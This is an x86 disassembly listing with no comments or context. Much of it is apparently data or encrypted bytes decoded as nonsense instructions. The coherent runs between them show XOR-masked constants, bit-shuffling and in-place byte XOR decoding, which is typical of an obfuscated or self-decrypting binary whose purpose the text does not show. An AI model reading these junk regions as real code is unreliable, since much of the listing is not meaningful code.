  409407:	mov    DWORD PTR [ebp-0x178b914b],esi
  40940d:	clc    
  40940e:	push   esi
  40940f:	cmp    BYTE PTR [eax-0x71602dc5],ah
  409415:	lock iret 
  409417:	add    dh,bl
  409419:	je     0x40941b
  40941b:	xor    eax,0xf808a76c
  409420:	push   DWORD PTR [ebp-0x51]
  409423:	mov    bl,0x10
  409425:	push   ds
  409426:	xor    eax,0xbb62f9e5
  40942b:	push   edx
  40942c:	fs mov ah,0xc0
  40942f:	leave  
  409430:	dec    edx
  409431:	out    0xb6,eax
  409433:	xor    BYTE PTR [eax-0x31783cd9],ah
  409439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40943a:	je     0x409432
  40943c:	sbb    ah,al
  40943e:	push   edx
  40943f:	xor    BYTE PTR gs:[ebx+0x41],dh
  409443:	and    cl,bh
  409445:	imul   ebp,DWORD PTR [esi+ebx*8-0x73],0xfffffff4
  40944a:	xchg   ebx,eax
  40944b:	icebp  
  40944c:	inc    esi
  40944d:	jl     0x40949c
  40944f:	dec    ebx
  409450:	(bad)  [edx]
  409452:	xor    eax,0x6ed9892b
  409457:	(bad)  
  409458:	lods   eax,DWORD PTR ds:[esi]
  409459:	icebp  
  40945a:	int    0xe5
  40945c:	outs   dx,BYTE PTR ds:[esi]
  40945d:	daa    
  40945e:	pop    eax
  40945f:	jb     0x4094c0
  409461:	aaa    
  409462:	hlt    
  409463:	sar    BYTE PTR [esi+0x30],1
  409466:	mov    esp,0xa2073a4d
  40946b:	mov    bl,BYTE PTR [eax+0x7aae3409]
  409471:	(bad)  
  409474:	xlat   BYTE PTR ds:[ebx]
  409475:	sub    BYTE PTR [ebp-0x27220dd2],bh
  40947b:	xchg   edx,eax
  40947c:	data16 mov ss,WORD PTR gs:[ecx-0x2c]
  409481:	stos   DWORD PTR es:[edi],eax
  409482:	add    ch,BYTE PTR [edi+ecx*4+0x3219d156]
  409489:	push   ecx
  40948a:	lock nop
  40948c:	mov    BYTE PTR [edi],dl
  40948e:	stos   BYTE PTR es:[edi],al
  40948f:	test   al,0x9f
  409491:	sar    DWORD PTR ds:[edi-0x43],1
  409495:	stc    
  409496:	jg     0x409430
  409498:	cwde   
  409499:	sub    ebp,ebx
  40949b:	fsubr  DWORD PTR [edi]
  40949d:	pop    edi
  40949e:	inc    edi
  40949f:	mov    edx,0xec10f189
  4094a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a5:	pusha  
  4094a6:	sub    BYTE PTR [edi-0x4401bf44],0x8c
  4094ad:	sahf   
  4094ae:	xchg   DWORD PTR [ebx+0x62d9a13a],ecx
  4094b4:	sub    BYTE PTR [ebp+0x49],dh
  4094b7:	xor    dh,BYTE PTR [edi]
  4094b9:	inc    edx
  4094ba:	stos   BYTE PTR es:[edi],al
  4094bb:	dec    ebp
  4094bc:	out    0xb2,al
  4094be:	sbb    esp,DWORD PTR [ecx+0x6a]
  4094c1:	adc    al,0xe5
  4094c3:	jecxz  0x409500
  4094c5:	ret    
  4094c6:	jo     0x4094bc
  4094c8:	stos   DWORD PTR es:[edi],eax
  4094c9:	cmp    ecx,DWORD PTR [edx]
  4094cb:	mov    ebp,0x47193caf
  4094d0:	mov    edi,0xe8a143db
  4094d5:	les    ebp,FWORD PTR [ecx-0x2c3d55b6]
  4094db:	or     eax,DWORD PTR [esi-0x7357aad]
  4094e1:	inc    ebx
  4094e2:	aas    
  4094e3:	jmp    0xc3cd:0xcf754751
  4094ea:	retf   
  4094eb:	mov    eax,ds:0x6bfe6981
  4094f0:	sbb    BYTE PTR [ebx+0x5a],ch
  4094f3:	mov    gs,WORD PTR [ebp-0x4d62104a]
  4094f9:	jno    0x409488
  4094fb:	ret    
  4094fc:	and    DWORD PTR ds:0xc59ba34b,esi
  409502:	xor    DWORD PTR [ecx+0x60c20393],eax
  409508:	imul   esi,DWORD PTR [eax+0x4e],0x4f9b7f36
  40950f:	and    dh,cl
  409511:	std    
  409512:	push   ebx
  409513:	dec    eax
  409514:	ins    DWORD PTR es:[edi],dx
  409515:	pop    edx
  409516:	shl    bl,0x71
  409519:	loopne 0x40955c
  40951b:	adc    al,0xaf
  40951d:	adc    al,0xa3
  40951f:	jnp    0x4094b7
  409521:	in     eax,0xc1
  409523:	and    al,0x22
  409525:	out    dx,eax
  409526:	jmp    0x50b75118
  40952b:	outs   dx,BYTE PTR ds:[esi]
  40952c:	fnstenv [esi+0x20f93b5d]
  409532:	sbb    DWORD PTR ds:[esi+edi*2],ecx
  409536:	mov    DWORD PTR [edi+0x76],ebp
  409539:	lods   eax,DWORD PTR ds:[esi]
  40953a:	xor    BYTE PTR [ebx+0x48],dl
  40953d:	sub    dh,dh
  40953f:	popa   
  409540:	cld    
  409541:	fadd   DWORD PTR [eax+0x4c]
  409544:	arpl   WORD PTR [esi],dx
  409546:	imul   esi,DWORD PTR [esi*1-0x17b02ae1],0x58
  40954e:	jp     0x409574
  409550:	lods   eax,DWORD PTR ds:[esi]
  409551:	ins    DWORD PTR es:[edi],dx
  409552:	cmc    
  409553:	dec    esp
  409554:	ficom  WORD PTR [eax+0x7284a55c]
  40955a:	adc    eax,0xa7665d4e
  40955f:	xchg   edx,eax
  409560:	sub    BYTE PTR [ecx+0x49],0x79
  409564:	push   0x3a487b8f
  409569:	sbb    dl,bh
  40956b:	mov    edi,0xbfc995a5
  409570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409571:	iret   
  409572:	ror    DWORD PTR [esi+0x73],0xa2
  409576:	dec    esi
  409577:	cmp    DWORD PTR [ebp+eax*4+0x65ab86c0],ebp
  40957e:	stos   BYTE PTR es:[edi],al
  40957f:	(bad)  
  409580:	sbb    BYTE PTR [edi+0x28],bh
  409583:	mov    al,0x1a
  409585:	test   eax,0xc8361e56
  40958a:	mov    bh,0x1b
  40958c:	inc    edx
  40958d:	ror    DWORD PTR [ecx],0x62
  409590:	xor    BYTE PTR [ebx],bl
  409592:	pushf  
  409593:	scas   eax,DWORD PTR es:[edi]
  409594:	add    eax,0x850eb742
  409599:	inc    edx
  40959a:	and    eax,0xc623f78b
  40959f:	push   ebp
  4095a0:	int    0x31
  4095a2:	add    ecx,DWORD PTR [edi+0x4c]
  4095a5:	dec    eax
  4095a6:	add    al,0x3
  4095a8:	lock push edi
  4095aa:	(bad)  
  4095ac:	rcr    BYTE PTR [ecx-0x5cc99615],0x16
  4095b3:	dec    ebx
  4095b4:	mov    ds,ebx
  4095b6:	sbb    eax,0x9cb71d2d
  4095bb:	xchg   ebp,eax
  4095bc:	fwait
  4095bd:	cmp    eax,0x4985904d
  4095c3:	xchg   ebx,eax
  4095c4:	dec    ebp
  4095c5:	dec    BYTE PTR [edx-0x67f378af]
  4095cb:	sti    
  4095cc:	mov    eax,0x2e1699e5
  4095d1:	xchg   esp,eax
  4095d2:	lahf   
  4095d3:	inc    edi
  4095d4:	jne    0x4095f2
  4095d6:	fst    QWORD PTR [eax-0x2d46db8a]
  4095dc:	ror    DWORD PTR [bp+si+0x3],cl
  4095e0:	out    dx,eax
  4095e1:	push   es
  4095e2:	lods   eax,DWORD PTR ds:[esi]
  4095e3:	fidiv  DWORD PTR [ebp+0x62]
  4095e6:	scas   eax,DWORD PTR es:[edi]
  4095e7:	sub    eax,0xe32a40f
  4095ec:	dec    ebp
  4095ed:	lea    esp,[esi]
  4095ef:	add    ch,cl
  4095f1:	cmp    BYTE PTR [ecx-0x4d6445ab],ah
  4095f7:	dec    eax
  4095f8:	and    DWORD PTR [edi-0x39],ecx
  4095fb:	xchg   ebx,eax
  4095fc:	pop    DWORD PTR [edi]
  4095fe:	mov    esi,0xf34f7d61
  409603:	test   al,0x31
  409605:	ss jge 0x409659
  409608:	or     BYTE PTR [ecx+0x33402535],ah
  40960e:	out    0x3b,al
  409610:	mov    dl,0x12
  409612:	push   edi
  409613:	xchg   edi,eax
  409614:	push   ebx
  409615:	xor    ebp,DWORD PTR [edi]
  409617:	mov    edi,0x11bb757c
  40961c:	add    ebp,DWORD PTR [edx]
  40961e:	mov    dh,BYTE PTR [edi+0xded070a]
  409624:	(bad)  
  409625:	mov    ebx,0x2ced91dd
  40962a:	in     eax,0x8b
  40962c:	push   ss
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422598
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xf4bca5c6
  4097de:	push   eax
  4097df:	iret   
  4097e0:	jo     0x409829
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [esi-0x4],cl
  4097eb:	div    DWORD PTR [eax]
  4097ed:	jo     0x4097d1
  4097ef:	test   eax,0xc5ed1cf4
  4097f4:	mov    DWORD PTR [edx],esi
  4097f6:	pop    ds
  4097f7:	fimul  DWORD PTR [eax-0x53]
  4097fa:	ins    BYTE PTR es:[edi],dx
  4097fb:	stos   DWORD PTR es:[edi],eax
  4097fc:	(bad)  
  4097fd:	adc    esi,DWORD PTR [ecx]
  4097ff:	gs ins DWORD PTR es:[edi],dx
  409801:	mov    DWORD PTR [eax-0x69],esp
  409804:	and    edx,DWORD PTR [edi]
  409806:	in     al,dx
  409807:	in     eax,0xd0
  409809:	(bad)  
  40980a:	jo     0x409828
  40980c:	pop    ss
  40980d:	inc    ebx
  40980e:	call   0xf11ed9fb
  409813:	test   eax,0x85aa2b15
  409818:	sahf   
  409819:	ret    
  40981a:	jmp    0x4097f6
  40981c:	or     BYTE PTR [ecx],al
  40981e:	ins    BYTE PTR es:[edi],dx
  40981f:	out    dx,al
  409820:	xchg   esi,eax
  409821:	aas    
  409822:	js     0x40983f
  409824:	inc    ebx
  409825:	mov    cl,0xd2
  409827:	les    eax,FWORD PTR [eax+0x51]
  40982a:	add    al,0x4d
  40982c:	cmp    DWORD PTR [edx],edx
  40982e:	dec    ebx
  40982f:	inc    ebx
  409830:	clc    
  409831:	arpl   WORD PTR [eax-0x2a6230b2],cx
  409837:	out    dx,al
  409838:	imul   BYTE PTR [edi+0xc38df1]
  40983e:	mov    ecx,0xafd72b37
  409843:	mov    bh,BYTE PTR [ecx+0x1e]
  409846:	xchg   edx,eax
  409847:	fwait
  409848:	lahf   
  409849:	mov    ecx,fs
  40984b:	(bad)  
  40984c:	cli    
  40984d:	xor    esi,ecx
  40984f:	sahf   
  409850:	adc    DWORD PTR [ecx+0x7cededf8],eax
  409856:	out    0x66,al
  409858:	dec    esp
  409859:	dec    eax
  40985a:	rcr    DWORD PTR [ebx],cl
  40985c:	pop    ebx
  40985d:	xchg   ecx,eax
  40985e:	sub    eax,ecx
  409860:	inc    ebx
  409861:	test   BYTE PTR [ecx-0x57],ch
  409864:	jns    0x4098af
  409866:	push   cs
  409867:	test   DWORD PTR [ecx],0x39a00f99
  40986d:	add    al,0xb7
  40986f:	not    BYTE PTR [esi-0x35a0273c]
  409875:	pop    DWORD PTR [esi-0x20]
  409878:	aaa    
  409879:	mov    edi,0xfca2b90b
  40987e:	ja     0x409855
  409880:	jne    0x4098fc
  409882:	cmp    ch,BYTE PTR [edi-0x1e]
  409885:	lahf   
  409886:	or     edx,edx
  409888:	pop    edi
  409889:	dec    esi
  40988a:	lods   eax,DWORD PTR ds:[esi]
  40988b:	jmp    0x6d1769cf
  409890:	imul   esp,DWORD PTR [esi+0x45ea8bea],0x47c157fe
  40989a:	neg    BYTE PTR [ecx+ebx*8-0x488f99d3]
  4098a1:	scas   al,BYTE PTR es:[edi]
  4098a2:	nop
  4098a3:	bound  ebx,QWORD PTR [edi+0x2c07e0cb]
  4098a9:	cli    
  4098aa:	mov    BYTE PTR [ecx],dh
  4098ac:	mov    ds:0xc37ce7,al
  4098b1:	bound  esp,QWORD PTR [esi]
  4098b3:	jle    0x409931
  4098b5:	xchg   esi,eax
  4098b6:	add    al,0x4
  4098b8:	xor    esi,ecx
  4098ba:	cs ins DWORD PTR es:[edi],dx
  4098bc:	mov    bl,0x5
  4098be:	ds jmp 0x8e99:0xdff1b88
  4098c6:	pop    es
  4098c7:	mov    ds:0xb5ad09ab,al
  4098cc:	dec    esp
  4098cd:	push   esp
  4098ce:	out    dx,al
  4098cf:	sub    BYTE PTR [edi+edi*2],dh
  4098d2:	and    DWORD PTR [ebx+ebp*1-0xe9b23d4],0xeddb3406
  4098dd:	push   cs
  4098de:	retf   
  4098df:	in     al,dx
  4098e0:	mov    ebx,0x508b1595
  4098e5:	fsub   QWORD PTR [ebx+0x62b38aa5]
  4098eb:	add    edx,DWORD PTR [edx+ebp*2]
  4098ee:	sbb    BYTE PTR ds:0x8d92d360,0xf7
  4098f5:	cld    
  4098f6:	in     eax,dx
  4098f7:	xor    eax,0x1991ea22
  4098fc:	gs ss hlt 
  4098ff:	cwde   
  409900:	sahf   
  409901:	xor    al,0x8b
  409903:	retf   0x6862
  409906:	or     al,0xea
  409908:	mov    ah,0x46
  40990a:	jmp    FWORD PTR [edx-0x6]
  40990d:	int    0x16
  40990f:	cld    
  409910:	add    ebp,eax
  409912:	push   esp
  409913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409914:	mov    ah,0x79
  409916:	jp     0x40995d
  409918:	or     edx,edi
  40991a:	not    BYTE PTR [ecx-0x5518c843]
  409920:	xor    ch,BYTE PTR [esi-0x3]
  409923:	xchg   ebp,eax
  409924:	push   ecx
  409925:	cmp    al,0x86
  409927:	int3   
  409928:	gs inc esi
  40992a:	popa   
  40992b:	jecxz  0x40994e
  40992d:	ret    0xd426
  409930:	cdq    
  409931:	retf   0xf1be
  409934:	adc    BYTE PTR ds:0x82b669eb,bh
  40993a:	into   
  40993b:	dec    edx
  40993c:	push   ecx
  40993d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40993e:	sub    dl,bh
  409940:	mov    es,ecx
  409942:	mov    gs,WORD PTR [edi+0x6e]
  409945:	scas   eax,DWORD PTR es:[edi]
  409946:	cmp    al,0x7b
  409948:	sahf   
  409949:	mov    ecx,0xf724bd49
  40994e:	mov    ebx,0x5ce36dc1
  409953:	test   DWORD PTR [esi+edi*8],esi
  409956:	pushf  
  409957:	mov    DWORD PTR [eax-0x1e],ecx
  40995a:	jp     0x40994a
  40995c:	stos   BYTE PTR es:[edi],al
  40995d:	ins    BYTE PTR es:[edi],dx
  40995e:	sub    BYTE PTR [esi+0x40],ch
  409961:	mov    dh,0xd3
  409963:	mov    bl,0x4b
  409965:	sar    BYTE PTR [edi-0x5e09ab72],cl
  40996b:	adc    esp,ebp
  40996d:	cmp    al,0x4d
  40996f:	mov    ebx,0x9974a72e
  409974:	cdq    
  409975:	mov    bl,0xca
  409977:	dec    ebx
  409978:	adc    dl,BYTE PTR [ebp-0x56e9539b]
  40997e:	out    0x72,al
  409980:	cmp    ecx,DWORD PTR [ebx-0x4f6f163]
  409986:	lods   al,BYTE PTR ds:[esi]
  409987:	mov    eax,ds:0xa2eb91d7
  40998c:	pushf  
  40998d:	sub    eax,0x36f98667
  409992:	outs   dx,DWORD PTR ds:[esi]
  409993:	inc    esi
  409994:	ins    BYTE PTR es:[edi],dx
  409995:	mov    ch,0xd0
  409997:	sub    al,0xef
  409999:	push   ss
  40999a:	xchg   ecx,eax
  40999b:	pop    ebp
  40999c:	ins    BYTE PTR es:[edi],dx
  40999d:	and    bh,dh
  40999f:	add    DWORD PTR [edx+0x56],ecx
  4099a2:	imul   edi,DWORD PTR [ebx+0x5c],0x8773f981
  4099a9:	sub    edx,DWORD PTR [ebx-0x4f]
  4099ac:	sbb    DWORD PTR [ebx],eax
  4099ae:	mov    DWORD PTR [ecx+0x5a29857a],esi
  4099b4:	sbb    eax,0x8e86b329
  4099b9:	test   DWORD PTR [eax-0x2e],esp
  4099bc:	adc    DWORD PTR [eax-0x43a9b06],edx
  4099c2:	inc    ebx
  4099c3:	loop   0x4099bb
  4099c5:	pop    edx
  4099c6:	fsubr  DWORD PTR [esi+0x32]
  4099c9:	xchg   DWORD PTR [esi-0x655e50c8],ecx
  4099cf:	xor    ebx,DWORD PTR [ecx-0x6d]
  4099d2:	cmp    DWORD PTR [ebx],ecx
  4099d4:	(bad)  
  4099d5:	sar    DWORD PTR ds:0xf4aa26c,cl
  4099db:	xor    eax,DWORD PTR [edx+0x2e1b2b0e]
  4099e1:	not    bh
  4099e3:	ret    0x6d
  4099e6:	(bad)  
  4099e7:	loope  0x4099b9
  4099e9:	div    esp
  4099eb:	test   DWORD PTR [ebp+0xd],esp
  4099ee:	lds    ebp,FWORD PTR [edi]
  4099f0:	stc    
  4099f1:	mov    edx,0x32d80f47
  4099f6:	adc    esi,edi
  4099f8:	test   DWORD PTR [edi+0x2c],ebx
  4099fb:	(bad)  
  4099fc:	scas   eax,DWORD PTR es:[edi]
  4099fd:	fbld   TBYTE PTR [ebp+ebp*4+0x1564f9e2]
  409a04:	pushf  
  409a05:	retf   0xed28
  409a08:	ins    BYTE PTR es:[edi],dx
  409a09:	xchg   ebp,eax
  409a0a:	jno    0x409a6d
  409a0c:	adc    BYTE PTR [ebx],dh
  409a0e:	cmp    al,0x60
  409a10:	sub    eax,0xb84ac328
  409a15:	fisubr DWORD PTR [ebp-0x21]
  409a18:	mov    al,BYTE PTR [ebp+0x5b2f7a6a]
  409a1e:	push   edx
  409a1f:	add    al,0x40
  409a21:	out    dx,eax
  409a22:	sbb    DWORD PTR [ecx+0x20c84082],ebp
  409a28:	mov    ebp,0xe97913d
  409a2d:	test   al,0x8f
  409a2f:	or     BYTE PTR [edx+0x3223d44f],dl
  409a35:	cmp    bl,BYTE PTR [eax+0x1511f249]
  409a3b:	sub    ecx,DWORD PTR [esi+0x17]
  409a3e:	add    al,0x3d
  409a40:	pushf  
  409a41:	or     DWORD PTR [ebp+0x219afc50],0x2d86eec6
  409a4b:	out    dx,al
  409a4c:	and    al,0x82
  409a4e:	(bad)  
  409a4f:	pop    esp
  409a50:	xor    esi,DWORD PTR [ecx-0x739b6e70]
  409a56:	or     BYTE PTR [esi+0x78],0x8f
  409a5a:	add    al,0x98
  409a5c:	mov    WORD PTR [edx],gs
  409a5e:	sub    al,0x7d
  409a60:	ins    BYTE PTR es:[edi],dx
  409a61:	dec    ebp
  409a62:	pop    ecx
  409a63:	push   0x3a
  409a65:	js     0x409ac1
  409a67:	out    0x6e,eax
  409a69:	adc    al,0x60
  409a6b:	call   0xb17:0x6a8fd4b2
  409a72:	or     edi,0x20
  409a75:	cs push cs
  409a77:	inc    eax
  409a78:	jne    0x409a3a
  409a7a:	push   ebp
  409a7b:	dec    eax
  409a7c:	lahf   
  409a7d:	xchg   ebx,eax
  409a7e:	mov    edx,DWORD PTR [ecx+edi*2]
  409a81:	iret   
  409a82:	adc    DWORD PTR [eax+ebp*4-0x659fbed7],esi
  409a89:	sar    BYTE PTR [eax-0x10],cl
  409a8c:	jbe    0x409ace
  409a8e:	icebp  
  409a8f:	ds add al,0x3d
  409a92:	pushf  
  409a93:	in     al,dx
  409a94:	sub    BYTE PTR [edi-0x280cf173],dh
  409a9a:	(bad)  
  409a9b:	lea    ebp,[ecx+ecx*4]
  409a9e:	adc    ecx,ecx
  409aa0:	xor    BYTE PTR [esi],0xe4
  409aa3:	jmp    0xcd39d587
  409aa8:	sub    edx,DWORD PTR [edx-0x124168b5]
  409aae:	in     al,dx
  409aaf:	cwde   
  409ab0:	inc    esp
  409ab1:	inc    DWORD PTR [edx-0x2328bf71]
  409ab7:	int    0x53
  409ab9:	or     edi,ebx
  409abb:	mov    ecx,0xdd1b01f2
  409ac0:	mov    cl,0xe1
  409ac2:	mov    BYTE PTR [ebx-0x5],bh
  409ac5:	jne    0x409b1d
  409ac7:	mov    esp,0xbc784c4a
  409acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409acd:	xchg   DWORD PTR [edi],edi
  409acf:	mov    cl,0xff
  409ad1:	pushw  cs
  409ad3:	xchg   BYTE PTR [edx+0x37f66509],dl
  409ad9:	adc    dl,bl
  409adb:	mov    ebx,0x5beba077
  409ae0:	mov    eax,cs:0x1db0af16
  409ae6:	fnstenv ds:0x36311c67
  409aec:	arpl   WORD PTR ds:[ecx],di
  409aef:	gs sub edx,ebx
  409af2:	xor    eax,0x86b6fcdf
  409af7:	adc    ch,cl
  409af9:	or     dl,BYTE PTR [edx+ebx*2]
  409afc:	(bad)  
  409afd:	xchg   ebx,eax
  409afe:	pop    edx
  409aff:	add    ah,bh
  409b01:	popf   
  409b02:	adc    DWORD PTR [edx+0x4a],esp
  409b05:	call   0x92a9:0x4c368a5
  409b0c:	push   ebx
  409b0d:	xchg   dh,bl
  409b0f:	sbb    al,0x55
  409b11:	js     0x409afb
  409b13:	dec    ebp
  409b14:	fs fwait
  409b16:	ins    DWORD PTR es:[edi],dx
  409b17:	scas   eax,DWORD PTR es:[edi]
  409b18:	cmp    eax,0x5248717
  409b1d:	lea    ebp,[ecx]
  409b1f:	ffree  st(0)
  409b21:	sti    
  409b22:	jno    0x409b41
  409b24:	enter  0x87b0,0xaa
  409b28:	push   es
  409b29:	and    eax,0xb6d5ffdc
  409b2e:	mov    ch,0x29
  409b30:	dec    esp
  409b31:	test   DWORD PTR [edi],ebp
  409b33:	sar    DWORD PTR [edi],0xd
  409b36:	push   ecx
  409b37:	or     bl,BYTE PTR [edx]
  409b39:	retf   0x57f8
  409b3c:	cmp    ebx,DWORD PTR [eax+0x498c1aac]
  409b42:	mov    cl,0x5b
  409b44:	jne    0x409b27
  409b46:	fnsave [edi]
  409b48:	or     al,0x68
  409b4a:	jae    0x409b2f
  409b4c:	jmp    0x8192b552
  409b51:	dec    ebx
  409b52:	jg     0x409b60
  409b54:	lock sbb DWORD PTR [edi],0xffffffb5
  409b58:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409b5a:	push   0x3abcc97f
  409b5f:	test   al,0x82
  409b61:	or     edx,DWORD PTR [ebp-0x27]
  409b64:	pop    ds
  409b65:	jne    0x409b78
  409b67:	fimul  DWORD PTR [ebx-0xf]
  409b6a:	cwde   
  409b6b:	pop    ecx
  409b6c:	mov    eax,0x9911bc90
  409b71:	cmp    al,0xca
  409b73:	lods   al,BYTE PTR ds:[esi]
  409b74:	scas   eax,DWORD PTR es:[edi]
  409b75:	or     BYTE PTR [esi],dh
  409b77:	dec    esp
  409b78:	sub    bh,dl
  409b7a:	xchg   ebx,edx
  409b7c:	leave  
  409b7d:	pop    ebp
  409b7e:	dec    ebp
  409b7f:	xlat   BYTE PTR ds:[ebx]
  409b80:	sub    esp,DWORD PTR [edx+edx*8]
  409b83:	or     dh,BYTE PTR [esi+0x5]
  409b86:	mov    ah,0x9b
  409b88:	shr    BYTE PTR [edi+0x3c286e0d],0x12
  409b8f:	xchg   ecx,eax
  409b90:	lods   eax,DWORD PTR ds:[esi]
  409b91:	push   eax
  409b92:	mov    ebx,DWORD PTR [ebx-0x1c6df9ca]
  409b98:	cli    
  409b99:	mov    al,0xd4
  409b9b:	and    DWORD PTR [edi+0x567ee043],0x541cfb46
  409ba5:	mov    eax,0x7a57f69b
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422598
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
